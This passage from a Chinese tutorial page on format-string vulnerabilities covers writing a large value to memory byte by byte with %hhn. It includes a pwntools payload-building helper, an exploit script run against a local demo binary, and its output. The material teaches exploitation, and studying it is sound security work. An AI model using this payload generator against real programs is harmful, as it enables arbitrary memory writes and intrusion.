+<p>有时候我们需要向内存中写入一个较大的数字，例如<code>0x1245678</code>这种，按照<code>%n</code>的原理，我们需要在前面打印出几亿多的字符，这显然是不可能的。为了解决这个问题我们可以通过将一个数字拆分成由低到高四个字节<code>[0x78,0x56,0x34,0x12]</code>，然后分别写入四个字节应该存放的地址：</p>
+<pre class="line-numbers language-sh" data-language="SH"><code class="language-sh">addr \x78
+addr + 1 \x56
+addr + 2 \x34
+addr + 3 \x12
+</code></pre>
+<p>但是要注意<code>%n</code>写入的是整型的大小，但是我们可以通过设置格式化字符串的<code>[length]</code>来设置控制写入的大小：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">格式化符</th>
+<th style="text-align:left">写入大小</th>
+<th style="text-align:left">类型对应</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><code>%n</code></td>
+<td style="text-align:left"><strong>4 字节</strong> (32位) / <strong>8 字节</strong> (64位)</td>
+<td style="text-align:left"><code>int*</code></td>
+</tr>
+<tr>
+<td style="text-align:left"><code>%hn</code></td>
+<td style="text-align:left"><strong>2 字节</strong></td>
+<td style="text-align:left"><code>short*</code></td>
+</tr>
+<tr>
+<td style="text-align:left"><code>%hhn</code></td>
+<td style="text-align:left"><strong>1 字节</strong></td>
+<td style="text-align:left"><code>char*</code></td>
+</tr>
+</tbody>
+</table>
+<p>这样我们就可以通过<code>%hhn</code>来在每个字节进行一定的写入。最终我们可以构造出<code>payload</code>：</p>
+<pre class="line-numbers language-sh" data-language="SH"><code class="language-sh">[addr[0]][addr[1]][addr[2]][addr[3]] + 
+[padding0]%[offset]$hhn + 
+[padding1]%[offset+1]$hhn + 
+[padding2]%[offset+2]$hhn +
+[padding3]%[offset+3]$hhn
+</code></pre>
+<p>所以关键就在于怎么计算出合适的<code>paddding</code>和正确的<code>offset</code> offset的计算不用多说，对于<code>padding</code>的计算我们可以用一个程序的结构帮助我们计算出来：（自己意会，逻辑很清晰）</p>
+<pre class="line-numbers language-py" data-language="PY"><code class="language-py">from pwn import *
+
+def fmt(prev, byte, idx):
+    '''
+    prev: 在此之前的字符数
+    byte: 需要写入的字节
+    idx: 需要写入的地址在参数列表中的位置
+    '''
+    if prev &lt; byte:
+        fmtstr = b'%' + str(byte - prev).encode() + b'c%' 
+    elif prev &gt; byte:
+        fmtstr = b'%' + str(0x100 + byte - prev).encode() + b'c%'
+    else:
+        fmtstr = b''
+
+    fmtstr += str(idx).encode() + b'$hhn'
+    return fmtstr  
+
+def fmt_str(offset, size, addr, target):
+    '''
+    offset: 需要写入的地址在参数列表中的位置
+    size: 需要写入的字节数
+    addr: 需要写入的地址
+    target: 需要写入的值
+    '''
+    payload = b''
+    for i in range(size):
+        if size == 4:
+            payload += p32(addr + i)
+        elif size == 8:
+            payload += p64(addr + i)
+    prev = len(payload)
+    for i in range(size):
+        payload += fmt(prev, (target &gt;&gt; i*8) &amp; 0xff, offset + i)
+        prev = (target &gt;&gt; i*8) &amp; 0xff
+    return payload 
+</code></pre>
+<p>我们可以写出exp:</p>
+<pre class="line-numbers language-python" data-language="PYTHON"><code class="language-python">p = process('./a.out')
+
+var = p.recv().split(b'.')
+a,b,c = int(var[0], 16), int(var[1], 16), int(var[2], 16)
+
+payload = fmt_str(6, 4, b, 0x12345678)
+p.sendline(payload)
+
+print(p.recv())
+</code></pre>
+<p>执行结果输出<code>modified b for a big number!</code>，实现了大数字的写入：</p>
+<pre class="line-numbers language-sh" data-language="SH"><code class="language-sh">&gt; python3 exp.py
+[+] Starting local process './a.out': pid 19143
+b'\x1c\xc0\x04\x08\x1d\xc0\x04\x08\x1e\xc0\x04\x08\x1f\xc0\x04\x08                                                                                                       \xd8                                                                                                                                                                                                                             \x1c                                                                                                                                                                                                                             &lt;                                                                                                                                                                                                                             \\modified b for a big number!\n'
+[*] Process './a.out' stopped with exit code 0 (pid 19143)
+</code></pre>
+<p>至此对格式化字符串漏洞的介绍和用法就到此为止了。</p>
+
+    <nav class="article-pager" aria-label="文章导航">
+    <span class="pager-link pager-prev is-disabled">上一章</span>
+      <a class="pager-link pager-home" href="../index.html">首页</a>
+    <a class="pager-link pager-next" href="122-PWN-1.html">下一章</a>
+    </nav>
+  </article>
+          
+    <footer class="site-footer">
+      <div class="site-footer-inner">
+    <span>articles: 123</span>
+    <span>words: 256252</span>
+      </div>
+    </footer>
+  
+
+        </section>
+        <aside class="sidebar-shell">
+          <div class="sidebar-inner">
+  <h2 class="sidebar-title">目录</h2>
+  <nav class="toc-nav" aria-label="Contents"><ol class="toc-list"><li class="toc-item toc-level-2"><a href="#格式化字符串漏洞">格式化字符串漏洞</a></li><li class="toc-item toc-level-3"><a href="#格式化字符串函数">格式化字符串函数</a></li><li class="toc-item toc-level-4"><a href="#格式化字符串">格式化字符串</a></li><li class="toc-item toc-level-4"><a href="#printf函数运行机理">printf函数运行机理</a></li><li class="toc-item toc-level-4"><a href="#演示">演示</a></li><li class="toc-item toc-level-3"><a href="#格式化字符串漏洞利用">格式化字符串漏洞利用</a></li><li class="toc-item toc-level-4"><a href="#程序崩溃">程序崩溃</a></li><li class="toc-item toc-level-4"><a href="#泄露内存">泄露内存</a></li><li class="toc-item toc-level-4"><a href="#覆盖内存">覆盖内存</a></li></ol></nav>
+</div>
+
+          <div class="scene-hud" aria-hidden="true">
+            <span class="scene-hud-line">Wheel: Scroll</span>
+            <span class="scene-hud-line">MMB: Drag View</span>
+            <span class="scene-hud-line">WASD: Move</span>
+            <span class="scene-hud-line">Space: Reset</span>
+            <span class="scene-hud-line">Tab: Day/Night</span>
+          </div>
+        </aside>
+      </main>
+    </div>
+  </div>
+</body>
+</html>
